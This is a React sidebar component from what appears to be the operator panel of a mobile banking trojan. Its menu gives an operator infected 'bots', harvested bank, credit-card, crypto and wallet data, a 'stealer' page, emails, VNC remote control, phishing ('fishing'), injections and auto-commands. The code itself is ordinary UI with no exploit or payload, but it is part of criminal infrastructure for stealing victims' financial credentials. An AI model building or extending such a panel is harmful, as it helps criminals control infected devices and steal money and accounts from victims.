import React, {useState} from "react";
import {Divider, Layout, Space} from "antd";

import {NavLink, useLocation} from "react-router-dom";
import {hasAccess} from "../../Util/hasAccess";
import {AppState} from "../../Store/RootReducer";
import LocalePicker from "../../Components/Misc/LocalePicker";
import ThemePicker from "../../Components/Misc/ThemePicker";
import {useTranslation} from "react-i18next";
import {panelName} from "../../Util/config";
import {useAppSelector} from "../../Hook/useAppSelector";

interface SidebarProps {
    collapsedState: boolean,
    collapseAction: () => void,
}

const Sidebar: React.FC<SidebarProps> = (props: SidebarProps) => {
    const settingsReducer = useAppSelector((state: AppState) => state.settings);

    const authReducer = useAppSelector((state: AppState) => state.auth);
    const countsReducer = useAppSelector((state: AppState) => state.counts);

    const location = useLocation();
    const {t} = useTranslation();

    const [botsExpand, setBotsExpand] = useState(false);

    return (
        <>
            <Layout.Sider
                trigger={null}
                collapsible
                className={props.collapsedState ? "menu-sidebar show" : "menu-sidebar"}
                width={220}
            >
                <div className="sider-affix">
                    <div className="menu-logo">
                        <Space className="menu-logo-title" size={2}>
                            <img
                                src={process.env.PUBLIC_URL + "/assets/images/hook.svg"}
                                style={{
                                    width: 30,
                                }}
                                alt=""
                            />

                            <span>{panelName}</span>
                        </Space>
                        <div
                            className="menu-logo-subtitle"
                            style={{
                                color: settingsReducer.theme === "light" ? "rgba(0,0,0, .3)" : "rgba(255,255,255, .3)",
                            }}
                        >
                            {t("SIDEBAR_PANEL_DESC")}
                        </div>
                    </div>

                    <div className="sider-group" style={{overflowY: "auto"}}>
                        <Space direction="vertical" size={0} style={{width: "100%"}} className="menu-nav">
                            {hasAccess(authReducer.user, "bots.list") && (
                                <>
                                    <div className="menu-link menu-link-bots" onClick={() => setBotsExpand(!botsExpand)} style={{cursor: "pointer"}}>
                                        <Space size={5}>
                                            <span className="anticon">
                                                <i className="fa-solid fa-mobile-screen" style={{color: "#4e71ca"}} />
                                            </span>

                                            <span>{t("SIDEBAR_NAV_BOTS")}</span>
                                        </Space>

                                        <div className="menu-link-group">
                                            {location.pathname !== "/bots" && countsReducer.isLoaded && countsReducer.bots > 0 && (
                                                <span className="menu-link-counter">+{countsReducer.bots}</span>
                                            )}
                                            <div className="menu-expand">
                                                <i className={`fa-solid fa-chevron-${botsExpand ? "up" : "down"}`} />
                                            </div>
                                        </div>
                                    </div>

                                    <div className="menu-expand-list" style={{
                                        height: botsExpand ? 160 : 0,
                                    }}>
                                        <NavLink to="/bots" className="menu-link">
                                            {t("ALL_BOTS")}
                                        </NavLink>
                                        <NavLink to="/favourites" className="menu-link">
                                            {t("FAVOURITE")}
                                        </NavLink>
                                        <NavLink to="/permissionless" className="menu-link">
                                            {t("PERMISSIONLESS")}
                                        </NavLink>
                                        <NavLink to="/online" className="menu-link">
                                            {t("ONLINE_BOTS")}
                                        </NavLink>
                                        <NavLink to="/offline" className="menu-link">
                                            {t("OFFLINE_BOTS")}
                                        </NavLink>
                                        <NavLink to="/uninstalled" className="menu-link">
                                            {t("UNINSTALLED_BOTS")}
                                        </NavLink>
                                    </div>
                                </>
                            )}

                            {hasAccess(authReducer.user, "banks.list") && (
                                <NavLink className="menu-link" to="/banks" onClick={props.collapseAction}>
                                    <Space size={5}>
                                        <span className="anticon">
                                            <i className="fa-solid fa-landmark" style={{color: "#8fc44f"}} />
                                        </span>
                                        {t("SIDEBAR_NAV_BANKS")}
                                    </Space>

                                    {location.pathname !== "/banks" && countsReducer.isLoaded && countsReducer.banks > 0 && (
                                        <span className="menu-link-counter">+{countsReducer.banks}</span>
                                    )}
                                </NavLink>
                            )}

                            {hasAccess(authReducer.user, "credit_cards.list") && (
                                <NavLink className="menu-link" to="/cards" onClick={props.collapseAction}>
                                    <Space size={5}>
                                        <span className="anticon">
                                            <i className="fa-regular fa-credit-card" style={{color: "#bc33b5"}} />
                                        </span>
                                        {t("SIDEBAR_NAV_CARDS")}
                                    </Space>

                                    {location.pathname !== "/cards" && countsReducer.isLoaded && countsReducer.credit_cards > 0 && (
                                        <span className="menu-link-counter">+{countsReducer.credit_cards}</span>
                                    )}
                                </NavLink>
                            )}

                            {hasAccess(authReducer.user, "crypt.list") && (
                                <NavLink className="menu-link" to="/crypt" onClick={props.collapseAction}>
                                    <Space size={5}>
                                        <span className="anticon">
                                            <i className="fa-brands fa-bitcoin" style={{color: "#e04d4d"}} />
                                        </span>
                                        {t("SIDEBAR_NAV_CRYPT")}
                                    </Space>

                                    {location.pathname !== "/crypt" && countsReducer.isLoaded && countsReducer.crypt > 0 && (
                                        <span className="menu-link-counter">+{countsReducer.crypt}</span>
                                    )}
                                </NavLink>
                            )}

                            {hasAccess(authReducer.user, "wallets.list") && (
                                <NavLink className="menu-link" to="/wallet" onClick={props.collapseAction}>
                                    <Space size={5}>
                                        <span className="anticon">
                                            <i className="fa-solid fa-wallet" style={{color: "#3ce86d"}} />
                                        </span>
                                        {t("SIDEBAR_NAV_WALLET")}
                                    </Space>

                                    {location.pathname !== "/wallet" && countsReducer.isLoaded && countsReducer.wallets > 0 && (
                                        <span className="menu-link-counter">+{countsReducer.wallets}</span>
                                    )}
                                </NavLink>
                            )}

                            {hasAccess(authReducer.user, "stealers.list") && (
                                <NavLink className="menu-link" to="/stealer" onClick={props.collapseAction}>
                                    <Space size={5}>
                                        <span className="anticon">
                                            <i className="fa-solid fa-user-ninja" style={{color: "#3ce86d"}} />
                                        </span>
                                        {t("SIDEBAR_NAV_STEALER")}
                                    </Space>

                                    {location.pathname !== "/stealer" && countsReducer.isLoaded && countsReducer.stealers > 0 && (
                                        <span className="menu-link-counter">+{countsReducer.stealers}</span>
                                    )}
                                </NavLink>
                            )}

                            {hasAccess(authReducer.user, "emails.list") && (
                                <NavLink className="menu-link" to="/email" onClick={props.collapseAction}>
                                    <Space size={5}>
                                        <span className="anticon">
                                            <i className="fa-solid fa-envelope" style={{color: "#8b52e0"}} />
                                        </span>
                                        {t("SIDEBAR_NAV_EMAIL")}
                                    </Space>

                                    {location.pathname !== "/email" && countsReducer.isLoaded && countsReducer.emails > 0 && (
                                        <span className="menu-link-counter">+{countsReducer.emails}</span>
                                    )}
                                </NavLink>
                            )}

                            {hasAccess(authReducer.user, "shops.list") && (
                                <NavLink className="menu-link" to="/shops" onClick={props.collapseAction}>
                                    <Space size={5}>
                                        <span className="anticon">
                                            <i className="fa-solid fa-bag-shopping" style={{color: "#d5d23e"}} />
                                        </span>
                                        {t("SIDEBAR_NAV_SHOPS")}
                                    </Space>

                                    {location.pathname !== "/shops" && countsReducer.isLoaded && countsReducer.shops > 0 && (
                                        <span className="menu-link-counter">+{countsReducer.shops}</span>
                                    )}
                                </NavLink>
                            )}

                            <Divider style={{margin: "10px 0 20px"}} />

                            <NavLink className="menu-link" to="/vnc" onClick={props.collapseAction}>
                                <Space size={5}>
                                    <span className="anticon">
                                        <i className="icon-vnc" style={{color: "#40e883"}} />
                                    </span>
                                    VNC
                                </Space>
                            </NavLink>

                            {hasAccess(authReducer.user, "users.list") && (
                                <NavLink className="menu-link" to="/users" onClick={props.collapseAction}>
                                    <Space size={5}>
                                        <span className="anticon">
                                            <i className="fa-solid fa-users-gear" style={{color: "#34b9d1"}} />
                                        </span>
                                        {t("SIDEBAR_NAV_USERS")}
                                    </Space>
                                </NavLink>
                            )}

                            <NavLink className="menu-link" to="/fishing" onClick={props.collapseAction}>
                                <Space size={5}>
                                    <span className="anticon">
                                        <i className="fa-solid fa-key" style={{color: "#40a2e8"}} />
                                    </span>
                                    {t("FISHING")}
                                </Space>
                            </NavLink>

                            {hasAccess(authReducer.user, "injections.list") && (
                                <NavLink className="menu-link" to="/injections" onClick={props.collapseAction}>
                                    <Space size={5}>
                                        <span className="anticon">
                                            <i className="fa-solid fa-syringe" style={{color: "#dd3ce8"}} />
                                        </span>
                                        {t("SIDEBAR_NAV_INJECTIONS")}
                                    </Space>
                                </NavLink>
                            )}

                            <NavLink className="menu-link" to="/permissions" onClick={props.collapseAction}>
                                <Space size={5}>
                                    <span className="anticon">
                                        <i className="fa-solid fa-unlock-keyhole" style={{color: "#e8e040"}} />
                                    </span>
                                    {t("BOT_PERMISSIONS")}
                                </Space>
                            </NavLink>

                            <NavLink className="menu-link" to="/filemanager" onClick={props.collapseAction}>
                                <Space size={5}>
                                    <span className="anticon">
                                        <i className="fa-regular fa-folder-open" style={{color: "#e87040"}} />
                                    </span>
                                    {t("SIDEBAR_NAV_FILE")}
                                </Space>
                            </NavLink>

                            {hasAccess(authReducer.user, "stats.list") && (
                                <NavLink className="menu-link" to="/stats" onClick={props.collapseAction}>
                                    <Space size={5}>
                                        <span className="anticon">
                                            <i className="fa-solid fa-chart-pie" style={{color: "#e5dc13"}} />
                                        </span>
                                        {t("SIDEBAR_NAV_STATS")}
                                    </Space>
                                </NavLink>
                            )}

                            <NavLink className="menu-link" to="/smartInjections" onClick={props.collapseAction}>
                                <Space size={5}>
                                    <span className="anticon">
                                        <i className="fa-solid fa-syringe" style={{color: "#40e883"}} />
                                    </span>
                                    {t("SIDEBAR_NAV_SMART_INJECTIONS")}
                                </Space>

                                {location.pathname !== "/smartInjections" && countsReducer.isLoaded && countsReducer.smart_injects > 0 && (
                                    <span className="menu-link-counter">+{countsReducer.smart_injects}</span>
                                )}
                            </NavLink>

                            <NavLink className="menu-link" to="/autocommands" onClick={props.collapseAction}>
                                <Space size={5}>
                                    <span className="anticon">
                                        <i className="fa-solid fa-terminal" style={{color: "#e87040"}} />
                                    </span>
                                    {t("AUTO_COMMANDS")}
                                </Space>
                            </NavLink>
                        </Space>

                        <Divider style={{margin: "10px 0 20px"}} />

                        <div style={{display: "flex", justifyContent: "space-between", alignItems: "center"}}>
                            <LocalePicker />
                            <ThemePicker />
                        </div>
                    </div>
                </div>
            </Layout.Sider>
        </>
    );
};

export default Sidebar;
